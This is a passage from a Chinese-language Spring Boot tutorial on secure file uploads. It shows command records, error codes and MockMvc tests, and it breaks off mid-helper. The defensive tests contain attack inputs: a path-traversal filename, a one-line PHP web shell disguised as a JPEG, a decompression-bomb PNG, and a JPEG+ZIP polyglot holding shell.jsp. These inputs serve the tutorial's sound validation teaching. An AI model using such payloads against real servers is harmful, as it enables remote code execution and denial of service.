 * 而<b>用主 {@code ObjectMapper} 序列化</b>才能保證格式與
 * {@code GET /orders/{id}} 一致（06 章 6.5.2）。
 *
 * <p>⚠️ 而它<b>絕不可以是 Entity</b> —— 那會洩漏內部欄位（03-rest-api 3.2）。
 */
public record OrderEvent(
    String orderId,
    long sequence,
    String type,
    Object payload,
    Instant occurredAt
) {}
```

#### `CallRecordingUploadedEvent`：交易後的非同步觸發

5.7.3 的 `complete()` 在交易結束時發布它。

```java
package example.shop.order.service.event;

/**
 * 通話錄音上傳完成。
 *
 * <p>★ 為什麼要一個事件而不是直接呼叫背景任務：
 * 5.7.3 的 {@code complete()} 在一個交易裡（寫 {@code call_recording} 表 +
 * 更新 {@code upload_intent} 狀態）。
 * 而「算時長、掃毒、轉檔」這些後續工作<b>必須在交易提交之後</b>才能開始 ——
 * 否則背景任務去查資料庫會查不到那筆紀錄（05-service 第 06 章的經典問題）。
 *
 * <p>做法：{@code @TransactionalEventListener(phase = AFTER_COMMIT)}。
 *
 * <p>⚠️ 事件只帶 <b>id</b>，不帶內容 ——
 * 和 05 章 5.3.4 的規則同一個理由：<b>跨執行緒只傳識別碼</b>。
 * 背景任務自己去 {@code ObjectStorage} 讀（那時檔案已經在正式位置了）。
 */
public record CallRecordingUploadedEvent(String recordingId, String orderId) {}
```

#### Service 的 command 型別

```java
package example.shop.product.service.command;

import example.shop.order.domain.Actor;

import java.util.List;

/**
 * 新增商品圖片（5.6.2）。
 *
 * <p>★★ 這個 command 的每一個欄位都<b>已經是安全的</b>：
 * {@code storageKey} 由我們產生、{@code displayName} 已清理、
 * {@code contentType} 由 magic number 判定、{@code content} 已重新編碼。
 *
 * <p>也就是說 <b>Service 層不需要再做任何檔案安全檢查</b> ——
 * 那是 Web 層（{@code UploadValidator}）的責任，而型別讓這個分工變得明確。
 *
 * <p>⚠️ {@code content} 是 {@code byte[]} 而不是 {@code MultipartFile}：
 * 那讓這個 command 可以安全地跨出請求執行緒（5.3.4 的規則）。
 */
public record AddProductImageCommand(
    String productId,
    Actor actor,
    String storageKey,
    String displayName,
    String contentType,
    byte[] content,
    String alt,
    Integer position,
    List<String> tags
) {
    public AddProductImageCommand {
        tags = (tags == null) ? List.of() : List.copyOf(tags);
    }

    /** ⚠️ 覆寫 toString()：預設會印出 {@code [B@1b6d3586}，而且可能很長。 */
    @Override
    public String toString() {
        return "AddProductImageCommand[productId=%s, key=%s, type=%s, %d bytes]"
                .formatted(productId, storageKey, contentType,
                           content == null ? 0 : content.length);
    }
}
```

```java
package example.shop.common.upload.service.command;

import example.shop.order.domain.Actor;

/** 申請一個預簽名上傳許可（5.7.2）。 */
public record CreateUploadIntentCommand(
    String orderId,
    Actor actor,
    String declaredFilename,
    String declaredContentType,
    long declaredSizeBytes,
    /** base64 的 SHA-256，可以是 null（選填但強烈建議，5.7.2）。 */
    String declaredSha256
) {}
```

```java
package example.shop.order.service.command;

import example.shop.order.domain.Actor;
import example.shop.order.service.query.OrderQuery;
import example.shop.order.web.dto.CreateExportRequest;

import java.util.List;

/**
 * 建立匯出工作（5.10.4）。
 *
 * <p>★ {@code query} 已經是「授權過的」—— mapper 的 {@code toQuery(filter, actor)}
 * 會把 {@code customerId} 條件強制加上（5.13.3 的授權測試）。
 * Service 層不需要再檢查「這個人能匯出誰的訂單」。
 */
public record CreateExportCommand(
    Actor actor,
    CreateExportRequest.ExportFormat format,
    OrderQuery query,
    List<String> columns,
    String notifyEmail
) {
    public CreateExportCommand {
        columns = (columns == null) ? List.of() : List.copyOf(columns);
    }
}
```

```java
package example.shop.customer.service.command;

import example.shop.order.domain.Actor;

/** 取代頭像（5.15 練習 1 的重寫版）。 */
public record ReplaceAvatarCommand(
    Actor actor,
    String storageKey,
    String displayName,
    String contentType,
    byte[] content
) {
    @Override
    public String toString() {
        return "ReplaceAvatarCommand[actor=%s, key=%s, %d bytes]"
                .formatted(actor == null ? null : actor.id(), storageKey,
                           content == null ? 0 : content.length);
    }
}
```

#### 回應 DTO：`ProductImageResponse`

5.2.2、5.3.4 的「壞例子」片段用了一個叫 `ImageResponse` 的型別 ——
那些片段是在示範**錯誤**的寫法，所以刻意不完整（它們也不該被複製）。
**正式的型別是這個**：

```java
package example.shop.product.web.dto;

import java.time.Instant;

/**
 * 商品圖片的回應（5.6.1 的契約）。
 *
 * <p>★ {@code url} 是 CDN 的公開網址（{@code api.upload.public-base-url} + storageKey），
 * <b>不是</b>我們的 API 端點 —— 商品圖是公開資料，讓 CDN 直接服務（5.8.4）。
 */
public record ProductImageResponse(
    String imageId,
    String url,
    String displayName,
    String contentType,
    int width,
    int height,
    long sizeBytes,
    int position,
    String alt,
    java.util.List<String> tags,
    Instant createdAt
) {
    public ProductImageResponse {
        tags = (tags == null) ? java.util.List.of() : java.util.List.copyOf(tags);
    }
}
```

#### `XlsxRowLimitExceededException`

5.9.5 的 xlsx 匯出用到它。

```java
package example.shop.order.web;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/**
 * 超過 xlsx 的列數上限。
 *
 * <p>★ 為什麼需要一個專門的例外（而不是複用 {@code SyncExportTooLargeException}）：
 * 這是一個<b>格式的硬限制</b>（1,048,576 列）而不是「我們設的上限」——
 * 所以正確的建議不是「縮小範圍再用同一個功能」，
 * 而是「換一個格式」。錯誤訊息必須說出這個差別。
 *
 * <p>⚠️ 這個例外<b>在串流過程中</b>被拋出，所以回應已經 committed（5.9.4）——
 * 客戶端會收到一個不完整的 xlsx。
 * <b>而那剛好是 ZIP 格式的優勢</b>：不完整的 xlsx 完全無法開啟，
 * 使用者不可能誤以為它是完整的（5.9.4 的表格）。
 *
 * <p>★ 所以真正的防護是<b>提早拒絕</b>：
 * {@code CreateExportRequest.ExportFilter} 的「366 天上限」驗證（5.10.5）
 * 讓這個例外在實務上不該發生 —— 它是一個安全網。
 */
public class XlsxRowLimitExceededException extends BusinessException {

    /** xlsx 格式的硬上限。 */
    public static final int XLSX_MAX_ROWS = 1_048_576;

    public XlsxRowLimitExceededException(int writtenRows) {
        super(ErrorCode.PAYLOAD_TOO_LARGE,
              "The export exceeds the xlsx row limit of %d (wrote %d rows)."
                      .formatted(XLSX_MAX_ROWS, writtenRows),
              null,
              Map.of("maxRows", XLSX_MAX_ROWS,
                     "writtenRows", writtenRows,
                     "alternative", Map.of(
                             "format", "CSV",
                             "description", "CSV 沒有列數上限"),
                     "hint", "資料量超過 Excel 的單一工作表上限（%,d 列）。"
                             .formatted(XLSX_MAX_ROWS)
                           + "請改用 CSV 格式，或縮小日期範圍。"),
              new Object[0],
              List.of());
    }
}
```

> **這一節（連同 03 章 3.13.3、04 章 4.13.6、06 章 6.9.3）示範了一個實務習慣**：
> **每寫完一個大段落，就回頭掃一次「引用了但沒定義的東西」。**
>
> 一個可以直接跑的粗略檢查：
>
> ```bash
> # 找出「被 new 但專案裡沒有定義」的類別
> grep -rhoE 'new [A-Z][A-Za-z0-9]*\(' src/main/java | sed 's/new //;s/($//;s/(//' \
>   | sort -u > /tmp/used.txt
> find src/main/java -name '*.java' -exec basename {} .java \; | sort -u > /tmp/defined.txt
> comm -23 /tmp/used.txt /tmp/defined.txt
> # ⚠️ 會有大量 JDK / Spring 的偽陽性 —— 但掃過一遍就能挑出真正漏掉的
> ```
>
> 編譯器當然會抓到這些。**但在「寫文件、寫設計稿、review PR」時沒有編譯器** ——
> 而那正是這類漏洞產生的時機。

#### `SseProperties`：5.11.6 用到的設定物件

```java
package example.shop.order.web;

import jakarta.validation.constraints.Max;
import jakarta.validation.constraints.Min;
import jakarta.validation.constraints.NotNull;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.validation.annotation.Validated;

import java.time.Duration;

/**
 * SSE 的設定（{@code api.sse.*}）。
 *
 * <p>★★ 為什麼這些數字必須是設定而不是常數（5.11.6 的完整說明）：
 * <ul>
 *   <li>運維要能在不改程式碼的情況下調上限（「今天有活動，先調到 8000」）。</li>
 *   <li>測試要能把上限調到 3，才能驗證「超過上限回 503」
 *       （07 章 7.11.4）—— 常數的話那個測試得真的開 5,000 條連線。</li>
 *   <li>心跳間隔要能在測試裡縮短到 200 ms，否則每個 SSE 測試都要等 20 秒。</li>
 * </ul>
 *
 * <p>★ 而 {@code @Validated} + {@code @Min/@Max} 讓「設定錯」變成<b>啟動失敗</b>
 * 而不是「執行到那一行才爆」——
 * {@code max-connections-per-actor: 0} 會讓每一個 SSE 請求都回 503，
 * 而那在啟動時就該被擋下來。
 */
@Validated
@ConfigurationProperties(prefix = "api.sse")
public record SseProperties(

        /** 本機的總連線上限（5.11.6）。 */
        @Min(1) @Max(50_000) int maxTotalConnections,

        /** 每個 actor 的連線上限（5.11.6）。 */
        @Min(1) @Max(100) int maxConnectionsPerActor,

        /**
         * 心跳間隔（5.11.4）。
         *
         * <p>⚠️ 必須 <b>小於</b> 所有中間層的閒置逾時的最小值：
         * Nginx 的 {@code proxy_read_timeout}（預設 60s）、
         * 雲端 LB 的 idle timeout（AWS ALB 預設 60s）、
         * 手機基地台的 NAT 逾時（常見 30～120s）。
         * <b>shop-service 用 20s，是「最保守的那個的 1/3」。</b>
         */
        @NotNull Duration heartbeatInterval,

        /** 單一連線的存活上限（5.11.4）—— 到了就主動關閉讓客戶端重連。 */
        @NotNull Duration connectionTimeout,

        /** {@code Last-Event-ID} 最多能往回補送幾個事件（5.11.5）。 */
        @Min(0) @Max(1000) int maxReplayEvents
) {
    public SseProperties {
        // ★ 一個「不可能對」的組合：心跳比連線逾時還長 → 一次心跳都送不出去
        if (heartbeatInterval.compareTo(connectionTimeout) >= 0) {
            throw new IllegalArgumentException(
                    "api.sse.heartbeat-interval (%s) 必須小於 connection-timeout (%s) ——"
                    .formatted(heartbeatInterval, connectionTimeout)
                    + " 否則連線會在第一次心跳之前就被關閉");
        }
    }
}
```

```yaml
# ★ 對應的預設值（5.12.2 的整合版裡也有）
api:
  sse:
    max-total-connections: 5000
    max-connections-per-actor: 10
    heartbeat-interval: 20s
    connection-timeout: 30m
    max-replay-events: 100
```

#### 這一章新增的 `ErrorCode`

03 章的 `ErrorCode` enum 要加四個常數：

```java
    // ── 409：新增於 05 章 ────────────────────────────────────────
    PRODUCT_IMAGE_LIMIT_EXCEEDED(HttpStatus.CONFLICT, "product-image-limit-exceeded"),

    // ── 202：新增於 05 章（掃毒未完成，5.5.6）─────────────────────
    // ⚠️ 這是唯一一個「2xx 的 ErrorCode」——
    //    它走的不是 advice 而是一個獨立的 handler，見下面的說明
    SCAN_PENDING          (HttpStatus.ACCEPTED,               "scan-pending",
                           Retry.CHECK_STATUS),

    // ── 410：新增於 05 章 ────────────────────────────────────────
    UPLOAD_INTENT_EXPIRED (HttpStatus.GONE,                   "upload-intent-expired"),
    DOWNLOAD_LINK_EXPIRED (HttpStatus.GONE,                   "download-link-expired"),
```

⚠️ **`SCAN_PENDING` 用 `HttpStatus.ACCEPTED`（202）是一個特殊情況**，值得討論：

```java
package example.shop.order.web;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/**
 * 收據還在掃毒，尚不可下載（5.5.6）。
 *
 * <p>★ 為什麼是 202 而不是 404 / 409 / 503：
 * <table>
 *   <tr><th>候選</th><th>問題</th></tr>
 *   <tr><td>404</td><td>資源存在，只是還不能給 —— 回 404 會讓客戶端放棄</td></tr>
 *   <tr><td>409</td><td>「衝突」的語意不對，而且客戶端不知道要重試</td></tr>
 *   <tr><td>503</td><td>暗示「伺服器有問題」，但其實一切正常</td></tr>
 *   <tr><td><b>202</b></td><td>✅「我收到你的請求了，但還沒完成」——
 *       正是這個情況。搭配 {@code Retry-After} 讓客戶端知道何時再來</td></tr>
 * </table>
 *
 * <p>⚠️ 但 202 是 2xx，而我們的 {@code ApiExceptionHandler} 是為 4xx/5xx 設計的。
 * 這會有兩個問題：
 * <ol>
 *   <li>03 章 3.12.1 的日誌分級規則會把它當「非錯誤」——✅ 這正確。</li>
 *   <li>{@code Problem}（RFC 9457）用在 2xx 上是<b>不符規格</b>的
 *       （RFC 9457 §3：「用於表達錯誤」）。</li>
 * </ol>
 *
 * <p><b>shop-service 的決定</b>：接受這個不精確。
 * 理由是「格式一致」對客戶端的價值大於「嚴格符合 RFC」——
 * 前端有一套處理 {@code code} / {@code userMessage} / {@code retryable}
 * 的元件，讓 202 也走同一套是最小驚訝原則。
 *
 * <p>如果你的 API 要通過嚴格的規格檢查，就改成
 * 「200 + 一個含 {@code status: "SCANNING"} 的正常 DTO」——
 * 那也是完全合理的設計（而且更符合 REST 的語意）。
 */
public class ReceiptScanPendingException extends BusinessException {
    public ReceiptScanPendingException(String receiptId) {
        super(ErrorCode.SCAN_PENDING,
              "The receipt is still being scanned for malware.",
              null,
              Map.of("retryAfterSeconds", 10,
                     "hint", "檔案正在進行安全檢查，請稍候再試。"),
              new Object[0],
              List.of());
    }
}
```

> **這一段示範了一件實務上很常見的事**：
> 一個設計決定同時牴觸兩個原則（「格式一致」與「符合規格」）。
> **重要的不是選哪一個，而是「明確地選、寫下理由、讓後人知道這不是疏忽」。**

#### `i18n` 訊息（03 章 3.4.4 的補充）

```properties
# src/main/resources/error-messages_zh_TW.properties
# ── 05 章新增 ─────────────────────────────────────────────────
error.PRODUCT_IMAGE_LIMIT_EXCEEDED.title=圖片數量已達上限
error.PRODUCT_IMAGE_LIMIT_EXCEEDED.user=每件商品最多 10 張圖片，請先刪除不需要的圖片。

error.SCAN_PENDING.title=安全檢查中
error.SCAN_PENDING.user=檔案正在進行安全檢查，請稍候再試。

error.UPLOAD_INTENT_EXPIRED.title=上傳許可已過期
error.UPLOAD_INTENT_EXPIRED.user=上傳許可已過期，請重新開始上傳。

error.DOWNLOAD_LINK_EXPIRED.title=下載連結已失效
error.DOWNLOAD_LINK_EXPIRED.user=下載連結已失效。請回到匯出頁面重新取得連結。

# ── 沿用既有的 code，這一章只是讓它們有了新的觸發情境 ──────────
# ⚠️ 這兩個 key 已經在 03 章 3.4.4 定義過了 —— 這裡列出來只是說明
#    「05 章的新情境沿用它們」。**不要在 properties 裡重複定義同一個 key**
#    （後者會蓋掉前者，而 Spring 不會警告）。
#
# PAYLOAD_TOO_LARGE：檔案過大、圖片尺寸過大、ZIP 解壓過大、同步匯出過大、
#                    冪等 body 過大、xlsx 列數過多（六種情境）
#   → 所以它的 userMessage 刻意不帶 {0}（03 章 3.4.4 有完整理由）

# UNSUPPORTED_MEDIA_TYPE：magic number 不在白名單
#   ⚠️ 03 章的文案是「資料格式有誤，請重新整理頁面後再試。」（針對 Content-Type）
#      而檔案上傳需要不同的說法。★ 解法不是重複定義同一個 key，
#      而是在 extensions.hint 放情境專屬的訊息（03 章 3.6.2）：
#        "hint": "不支援這種檔案格式。目前接受 JPG、PNG、WebP、GIF。"
```

> ### ⚠️ 這一節的一般規則：**一個 `ErrorCode` 只能有一份 i18n 訊息** ★
>
> 很自然的衝動是「上傳的 415 要有上傳專屬的文案」，於是在
> 05 章的段落裡再寫一次 `error.UNSUPPORTED_MEDIA_TYPE.user=...`。
>
> **但 properties 檔的同一個 key 只有最後一次定義生效，而 Spring 不會警告。**
> 於是「Content-Type 不對」的請求也會看到「目前接受 JPG、PNG、WebP、GIF」——
> 一個完全不相關的訊息。
>
> **正確的分工**：
>
> | 放哪裡 | 內容 | 隨情境變化 |
> |---|---|---|
> | `error.<CODE>.title` | 錯誤類型 | ❌ 一個 code 一份 |
> | `error.<CODE>.user` | 通用的使用者訊息 | ❌ 一個 code 一份 |
> | **`extensions.hint`** | **情境專屬的說明** | ✅ 每次拋例外各自給 |
>
> ★ 而 03 章 3.4.5 的 `訊息完整()` 測試會掃過所有 code，
> 07 章 7.8.2 的 `ErrorCodeContractTest` 還會檢查
> 「`user` 不含技術詞彙、長度合理」——
> **但沒有測試抓得到「同一個 key 定義兩次」**，因為那在執行期是合法的。
> 👉 所以它靠一條規則與一次 code review。

⚠️ **`PAYLOAD_TOO_LARGE` 的 `userMessage` 很籠統，因為它有六種觸發情境。**
具體的說明放在 `extensions.hint`（每個情境各自客製）——
這正是 03 章 3.6.2 讓 `Problem` 有 `extensions` 的理由。

#### 依賴（`pom.xml` 的增補）

```xml
    <!-- xlsx 匯出（5.9.5）——⚠️ 約 12 MB，只在需要時加 -->
    <dependency>
      <groupId>org.apache.poi</groupId>
      <artifactId>poi-ooxml</artifactId>
      <version>5.2.5</version>
      <exclusions>
        <!-- ★ 排除 log4j 的橋接：Boot 用 logback，兩個一起會有警告與雙重輸出 -->
        <exclusion>
          <groupId>org.apache.logging.log4j</groupId>
          <artifactId>log4j-api</artifactId>
        </exclusion>
      </exclusions>
    </dependency>

    <!-- ULID（5.4.3 的 StorageKeys）-->
    <dependency>
      <groupId>com.github.f4b6a3</groupId>
      <artifactId>ulid-creator</artifactId>
      <version>5.2.3</version>
    </dependency>

    <!-- S3（06-repository 會用到；Web 層只依賴 ObjectStorage 介面）-->
    <dependency>
      <groupId>software.amazon.awssdk</groupId>
      <artifactId>s3</artifactId>
    </dependency>

    <!-- Redis pub/sub（5.11.6）-->
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-data-redis</artifactId>
    </dependency>
```

⚠️ **`poi-ooxml` 的 `log4j-api` 排除很重要**：
不排除的話啟動時會出現
`ERROR StatusLogger Log4j2 could not find a logging implementation`，
而那個訊息會讓人以為日誌設定壞了（其實只是 POI 的內部日誌）。

⚠️ **`ImageIO`（5.5.3）不需要額外依賴** —— 它在 JDK 裡。
但**如果你用 alpine 或 distroless 的 base image，可能沒有 `libfreetype`**，
結果是 `ImageIO.write` 拋 `UnsatisfiedLinkError`：

```dockerfile
# ★ Alpine 需要這些（headless AWT）
FROM eclipse-temurin:21-jre-alpine
RUN apk add --no-cache freetype fontconfig ttf-dejavu

# ★ 而且一定要開 headless，否則在沒有 X server 的容器裡會失敗
ENV JAVA_TOOL_OPTIONS="-Djava.awt.headless=true"
```

⚠️ **`-Djava.awt.headless=true`** —— Spring Boot 預設會設它
（`spring.main.web-application-type` 不影響這個；Boot 的 `SpringApplication`
預設 `headless = true`），**但如果你在 `main` 之前就用到 AWT，就會來不及**。
明確在 JVM 參數設它最保險。

---

## 5.13 測試

### 5.13.1 上傳的 MockMvc 測試

```java
package example.shop.product.web;

import example.shop.common.upload.*;
import example.shop.product.service.ProductImageService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.web.servlet.MockMvc;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;

import static org.mockito.ArgumentMatchers.any;
import static org.mockito.BDDMockito.given;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.multipart;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * 圖片上傳的 Web 層測試。
 *
 * <p>★ 這裡用真的 {@link UploadValidator}（而不是 mock），
 * 因為「驗證是否正確」正是這一章的重點。
 * mock 掉它等於什麼都沒測到。
 *
 * <p>只 mock {@link ProductImageService}（下一層）與 {@link MalwareScanner}（外部依賴）。
 */
@WebMvcTest(ProductImageController.class)
@org.springframework.context.annotation.Import({
        UploadValidator.class, ImageReencoder.class})
class ProductImageControllerTest {

    @Autowired MockMvc mockMvc;

    // ⚠️ 版本：`@MockitoBean` 是 Spring Framework 6.2（Boot 3.4）才有的。
    //    本課程的基準是 Boot 3.2.5 —— 在基準上請改成
    //    `@MockBean`（import org.springframework.boot.test.mock.mockito.MockBean）。
    //    全站政策與逐處註記見 07 章 7.6.1。
    @MockitoBean ProductImageService imageService;
    @MockitoBean ProductImageWebMapper mapper;
    @MockitoBean MalwareScanner scanner;
    @MockitoBean UploadProperties uploadProperties;

    @BeforeEach
    void setUp() {
        given(uploadProperties.maxFileSize())
                .willReturn(org.springframework.util.unit.DataSize.ofMegabytes(10));
        given(scanner.scan(any(), any()))
                .willReturn(MalwareScanner.ScanResult.clean());
    }

    // ── 快樂路徑 ──────────────────────────────────────────────────

    @Test
    @DisplayName("上傳一張真的 PNG → 201")
    void 上傳成功() throws Exception {
        // ★ 一定要用「真的圖片位元組」——
        //   假的 "fake-image".getBytes() 過不了 magic number 檢查（5.5.2），
        //   那樣測試會失敗，而你會以為是程式壞了。
        byte[] png = realPng(200, 200);

        mockMvc.perform(multipart("/products/P-1001/images")
                        .file(new MockMultipartFile("file", "主圖.png", "image/png", png))
                        .file(new MockMultipartFile("metadata", "", "application/json",
                                """
                                {"alt":"商品主圖","position":1,"tags":["main"]}
                                """.getBytes(StandardCharsets.UTF_8)))
                        .header("Idempotency-Key", "550e8400-e29b-41d4-a716-446655440000")
                        .with(customer("cus_1")))
                .andExpect(status().isCreated())
                .andExpect(header().exists("Location"));
    }

    // ── 檔名攻擊 ──────────────────────────────────────────────────

    @Nested
    @DisplayName("檔名不可信（5.4）")
    class 檔名 {

        @Test
        @DisplayName("路徑穿越的檔名不會影響儲存位置")
        void 路徑穿越() throws Exception {
            byte[] png = realPng(10, 10);

            mockMvc.perform(multipart("/products/P-1001/images")
                            .file(new MockMultipartFile("file",
                                    "../../../../opt/app/config/application.yml",
                                    "image/png", png))
                            .with(customer("cus_1")))
                    .andExpect(status().isCreated());

            // ★ 關鍵斷言：傳給 Service 的 storageKey 完全不含客戶端的檔名
            var captor = org.mockito.ArgumentCaptor
                    .forClass(example.shop.product.service.command.AddProductImageCommand.class);
            org.mockito.Mockito.verify(imageService).addImage(captor.capture());

            var command = captor.getValue();
            org.assertj.core.api.Assertions.assertThat(command.storageKey())
                    .startsWith("product-images/")
                    .doesNotContain("..")
                    .doesNotContain("application.yml")
                    .matches("^product-images/\\d{4}/\\d{2}/\\d{2}/[0-9a-z]{26}\\.png$");

            // displayName 被清理成安全的形式，但保留可辨識性
            // ★ 副檔名被【強制】換成 png（內容被二次編碼過，5.5.7 用 sanitizeForcing）——
            //   所以是 "application.png" 而不是 "application.yml"
            org.assertj.core.api.Assertions.assertThat(command.displayName())
                    .as("displayName 的副檔名必須反映【實際內容】而不是客戶端聲稱的")
                    .isEqualTo("application.png")
                    .doesNotContain("/");
        }

        @Test
        @DisplayName("null 檔名不會 NPE")
        void null檔名() throws Exception {
            byte[] png = realPng(10, 10);
            // MockMultipartFile 的 originalFilename 傳 null
            mockMvc.perform(multipart("/products/P-1001/images")
                            .file(new MockMultipartFile("file", null, "image/png", png))
                            .with(customer("cus_1")))
                    .andExpect(status().isCreated());
        }
    }

    // ── 內容攻擊 ──────────────────────────────────────────────────

    @Nested
    @DisplayName("內容驗證（5.5）")
    class 內容 {

        @Test
        @DisplayName("PHP 檔案偽裝成 JPEG → 415")
        void 偽裝的PHP() throws Exception {
            byte[] php = "<?php system($_GET['cmd']); ?>".getBytes(StandardCharsets.UTF_8);

            mockMvc.perform(multipart("/products/P-1001/images")
                            .file(new MockMultipartFile("file", "cute-cat.jpg",
                                    "image/jpeg", php))
                            .with(customer("cus_1")))
                    .andExpect(status().isUnsupportedMediaType())
                    .andExpect(jsonPath("$.code").value("UNSUPPORTED_MEDIA_TYPE"))
                    // ★ 回應要同時報告「宣告的」與「偵測到的」——
                    //   這對客戶端除錯非常有幫助
                    .andExpect(jsonPath("$.detectedType").value("UNKNOWN"))
                    .andExpect(jsonPath("$.declaredContentType").value("image/jpeg"));
        }

        @Test
        @DisplayName("PDF 上傳到圖片端點 → 415（即使 PDF 本身合法）")
        void PDF被拒() throws Exception {
            byte[] pdf = "%PDF-1.4\n%%EOF\n".getBytes(StandardCharsets.US_ASCII);

            mockMvc.perform(multipart("/products/P-1001/images")
                            .file(new MockMultipartFile("file", "a.pdf",
                                    "application/pdf", pdf))
                            .with(customer("cus_1")))
                    .andExpect(status().isUnsupportedMediaType())
                    .andExpect(jsonPath("$.detectedType").value("PDF"));
        }

        @Test
        @DisplayName("解壓縮炸彈（41 KB 的 20000×20000 PNG）→ 413 而不是 OOM ★")
        void 圖片炸彈() throws Exception {
            byte[] bomb = decompressionBombPng(20_000, 20_000);
            // ★ 先斷言「檔案真的很小」—— 否則測試沒有意義
            //   （如果不小心產生了一個 1 GB 的檔案，測試會被 max-file-size 擋掉，
            //     那就沒測到我們想測的東西）
            org.assertj.core.api.Assertions.assertThat(bomb.length).isLessThan(200_000);

            mockMvc.perform(multipart("/products/P-1001/images")
                            .file(new MockMultipartFile("file", "bomb.png",
                                    "image/png", bomb))
                            .with(customer("cus_1")))
                    .andExpect(status().isPayloadTooLarge())
                    .andExpect(jsonPath("$.pixels").value(400_000_000L))
                    .andExpect(jsonPath("$.maxPixels").exists());
        }

        @Test
        @DisplayName("EXIF 被二次編碼移除 ★（個資防護）")
        void EXIF被移除() throws Exception {
            // ★ 一張含 GPS 座標的 JPEG —— 使用者手機拍的照片都有這個
            byte[] withGps = jpegWithGpsExif(100, 100, 25.0330, 121.5654);

            mockMvc.perform(multipart("/products/P-1001/images")
                            .file(new MockMultipartFile("file", "IMG_0001.jpg",
                                    "image/jpeg", withGps))
                            .with(customer("cus_1")))
                    .andExpect(status().isCreated());

            var captor = org.mockito.ArgumentCaptor
                    .forClass(example.shop.product.service.command.AddProductImageCommand.class);
            org.mockito.Mockito.verify(imageService).addImage(captor.capture());

            byte[] stored = captor.getValue().content();
            // ★ EXIF 的 APP1 marker 是 FF E1，後面接 "Exif\0\0"
            org.assertj.core.api.Assertions
                    .assertThat(containsExifMarker(stored))
                    .as("重新編碼後的圖片不應含 EXIF（會洩漏拍攝地點）")
                    .isFalse();
        }

        @Test
        @DisplayName("附在 JPEG 後面的 ZIP（polyglot）被二次編碼消滅 ★")
        void polyglot() throws Exception {
            byte[] jpeg = realJpeg(50, 50);
            byte[] zip = minimalZip("shell.jsp", "<%= 1 %>");
            byte[] polyglot = concat(jpeg, zip);

            mockMvc.perform(multipart("/products/P-1001/images")
                            .file(new MockMultipartFile("file", "cat.jpg",
                                    "image/jpeg", polyglot))
                            .with(customer("cus_1")))
                    .andExpect(status().isCreated());

            var captor = org.mockito.ArgumentCaptor
                    .forClass(example.shop.product.service.command.AddProductImageCommand.class);
            org.mockito.Mockito.verify(imageService).addImage(captor.capture());

            byte[] stored = captor.getValue().content();
            // ★ ZIP 的 local file header（50 4B 03 04）應該不見了
            org.assertj.core.api.Assertions
                    .assertThat(indexOf(stored, new byte[]{0x50, 0x4B, 0x03, 0x04}))
                    .as("重新編碼後不該含 ZIP 結構")
                    .isEqualTo(-1);
        }

        @Test
        @DisplayName("掃毒命中 → 422，而回應不含病毒名稱 ★")
        void 掃毒命中() throws Exception {
            given(scanner.scan(any(), any()))
                    .willReturn(MalwareScanner.ScanResult.infected("Eicar-Test-Signature"));

            byte[] pdf = "%PDF-1.4\n%%EOF\n".getBytes(StandardCharsets.US_ASCII);

            mockMvc.perform(multipart("/orders/ord_1/receipts")
                            .file(new MockMultipartFile("file", "receipt.pdf",
                                    "application/pdf", pdf))
                            .with(customer("cus_1")))
                    .andExpect(status().isUnprocessableEntity())
                    .andExpect(jsonPath("$.code").value("VALIDATION_FAILED"))
                    // ★ 關鍵：病毒名稱不可以出現在回應裡（5.5.7 的理由）
                    .andExpect(content().string(
                            org.hamcrest.Matchers.not(
                                    org.hamcrest.Matchers.containsString("Eicar"))));
        }
    }

    // ── 大小 ──────────────────────────────────────────────────────

    @Test
    @DisplayName("空檔案 → 422")
    void 空檔案() throws Exception {
        mockMvc.perform(multipart("/products/P-1001/images")
                        .file(new MockMultipartFile("file", "empty.png",
                                "image/png", new byte[0]))
                        .with(customer("cus_1")))
                .andExpect(status().isUnprocessableEntity());
    }

    @Test
    @DisplayName("完全沒有 file part → 400 且訊息說得清楚")
    void 缺少file() throws Exception {
        mockMvc.perform(multipart("/products/P-1001/images")
                        .file(new MockMultipartFile("metadata", "", "application/json",
                                "{}".getBytes()))
                        .with(customer("cus_1")))
                .andExpect(status().isBadRequest())
                // MissingServletRequestPartException → 03 章的 SpringExceptionMapper
                .andExpect(jsonPath("$.code").value("MALFORMED_REQUEST"))
                .andExpect(jsonPath("$.detail").value(
                        org.hamcrest.Matchers.containsString("file")));
    }

    @Test
    @DisplayName("metadata part 缺 Content-Type → 415 且 hint 說明原因 ★")
    void metadata缺ContentType() throws Exception {
        byte[] png = realPng(10, 10);

        mockMvc.perform(multipart("/products/P-1001/images")
                        .file(new MockMultipartFile("file", "a.png", "image/png", png))
                        // ★ contentType 傳 null —— 這是真實世界最常見的客戶端錯誤
                        .file(new MockMultipartFile("metadata", "", null,
                                "{\"alt\":\"x\"}".getBytes()))
                        .with(customer("cus_1")))
                .andExpect(status().isUnsupportedMediaType())
                .andExpect(jsonPath("$.hint").value(
                        org.hamcrest.Matchers.containsString("Content-Type")));
    }

    // ── 測試輔助（★ 這些方法本身就是這一章的重點）────────────────

    /**
     * 產生一張真的 PNG。
     *
     * <p>⚠️ 為什麼不用 {@code "fake".getBytes()}：
     * 我們的驗證會檢查 magic number（5.5.2）與尺寸（5.5.3），
     * 假資料過不了 → 測試永遠是 415 → <b>快樂路徑等於沒測</b>。
     */
    static byte[] realPng(int width, int height) {
        try {
            var image = new java.awt.image.BufferedImage(
                    width, height, java.awt.image.BufferedImage.TYPE_INT_RGB);
            var out = new ByteArrayOutputStream();
            javax.imageio.ImageIO.write(image, "png", out);
            return out.toByteArray();
        } catch (java.io.IOException e) {
            throw new IllegalStateException(e);
        }
    }

    static byte[] realJpeg(int width, int height) {
        try {
            var image = new java.awt.image.BufferedImage(
